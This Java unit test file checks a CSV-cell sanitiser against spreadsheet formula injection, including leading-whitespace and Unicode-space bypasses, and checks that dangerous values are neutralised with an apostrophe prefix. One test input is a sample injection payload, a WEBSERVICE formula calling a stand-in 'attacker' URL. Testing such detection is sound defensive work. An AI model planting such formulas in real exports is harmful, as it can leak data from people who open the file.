package com.example.sso.metadata.internal.application;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/** What a spreadsheet will and will not execute when it opens a cell we wrote. */
class CsvCellsTest {

    @Test
    void everyCharacterThatOpensAFormulaIsRecognised() {
        assertThat("=+-@".chars().mapToObj(c -> (char) c + "cmd").toList())
                .allMatch(CsvCells::isFormula);
    }

    /**
     * A spreadsheet trims a cell before deciding whether it is a formula, so any run of leading blanks walks
     * a payload past a first-character check and still evaluates. The no-break space matters on its own:
     * {@link String#stripLeading()} does not consider U+00A0 blank, so relying on it reintroduces the bypass.
     */
    @Test
    void leadingBlanksDoNotHideAFormula() {
        assertThat(CsvCells.isFormula(" =WEBSERVICE(\"http://attacker\")")).isTrue();
        assertThat(CsvCells.isFormula("\t=cmd")).isTrue();
        assertThat(CsvCells.isFormula("\u00a0=cmd")).isTrue();
        assertThat(CsvCells.isFormula("\u00a0 \t=cmd")).isTrue();
        // A space nobody thought to enumerate — ideographic, vertical tab, next-line.
        assertThat(CsvCells.isFormula("\u3000=cmd")).isTrue();
        assertThat(CsvCells.isFormula("\u000b=cmd")).isTrue();
        assertThat(CsvCells.isFormula("\u2003=cmd")).isTrue();
    }

    /** Whitespace is what hides a formula, not what makes one — a tab before ordinary text is ordinary text. */
    @Test
    void aBlankBeforeOrdinaryTextIsNotAFormula() {
        assertThat(CsvCells.isFormula("\tcmd")).isFalse();
        assertThat(CsvCells.isFormula("   ")).isFalse();
    }

    @Test
    void ordinaryTextIsLeftAlone() {
        assertThat(CsvCells.isFormula("ada@example.com")).isFalse();
        assertThat(CsvCells.neutralise("ada@example.com")).isEqualTo("ada@example.com");
        assertThat(CsvCells.isFormula("")).isFalse();
        assertThat(CsvCells.isFormula(null)).isFalse();
    }

    /**
     * Prefixed, not stripped: the leading character may be the administrator's data — a negative number, a
     * group named {@code -temp} — and silently rewriting it to make the file printable is its own bug.
     */
    @Test
    void aDangerousValueKeepsItsContentAndLosesItsMeaning() {
        assertThat(CsvCells.neutralise("-42")).isEqualTo("'-42");
        assertThat(CsvCells.neutralise(" =cmd")).isEqualTo("' =cmd");
    }
}
